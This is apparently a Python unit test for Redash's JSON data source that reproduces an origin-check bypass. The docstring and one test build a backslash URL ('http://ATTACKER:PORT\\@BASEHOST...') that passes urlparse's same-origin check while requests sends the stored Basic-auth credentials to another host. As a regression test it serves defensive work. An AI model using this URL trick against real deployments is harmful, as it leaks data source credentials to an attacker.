"""JSON data source: a query URL may only reference the data source base URL's origin
(redash/query_runner/json_ds.py::_validate_url_within_base / _origin).

The origin is computed with urllib.parse.urlparse, but the HTTP request is sent by
requests/urllib3, which split a URL authority on a backslash differently from urllib.
A URL like  http://ATTACKER:PORT\\@BASEHOST:BASEPORT/  is parsed by urlparse as host
BASEHOST:BASEPORT (passes the same-origin check) while requests connects to ATTACKER:PORT
-- and sends the data source's Basic-auth credentials there.
"""
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from unittest import TestCase, mock

import requests

from redash.query_runner.json_ds import JSON


class _Recorder(BaseHTTPRequestHandler):
    def do_GET(self):
        self.server.hits.append(self.headers.get("Authorization"))
        body = b'[{"ok": 1}]'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def _serve():
    srv = HTTPServer(("127.0.0.1", 0), _Recorder)
    srv.hits = []
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


class TestJSONOriginCheck(TestCase):
    def setUp(self):
        self.base = _serve()
        self.attacker = _serve()
        self.addCleanup(self.base.shutdown)
        self.addCleanup(self.attacker.shutdown)
        # Use a plain session (both targets are loopback); the origin check is independent
        # of the private-address guard.
        p = mock.patch("redash.query_runner.requests_session", requests.Session())
        p.start()
        self.addCleanup(p.stop)
        self.runner = JSON(
            {
                "base_url": "http://127.0.0.1:%d/" % self.base.server_port,
                "username": "ds-user",
                "password": "ds-secret",
            }
        )

    def test_control_other_origin_is_rejected(self):
        with self.assertRaises(Exception):
            self.runner.run_query("url: http://localhost:%d/x" % self.attacker.server_port, None)
        self.assertEqual([], self.attacker.hits)

    def test_backslash_url_reaches_attacker_with_credentials(self):
        # single-quoted YAML so the backslash reaches the URL verbatim
        url = "http://localhost:%d\\@127.0.0.1:%d/x" % (self.attacker.server_port, self.base.server_port)
        try:
            self.runner.run_query("url: '%s'" % url, None)
        except Exception:
            pass
        # BUG: the request (carrying the data source's Basic credentials) hit the attacker origin,
        # which the same-origin check was meant to forbid.
        self.assertEqual([], self.attacker.hits, "request leaked to attacker origin: %r" % self.attacker.hits)
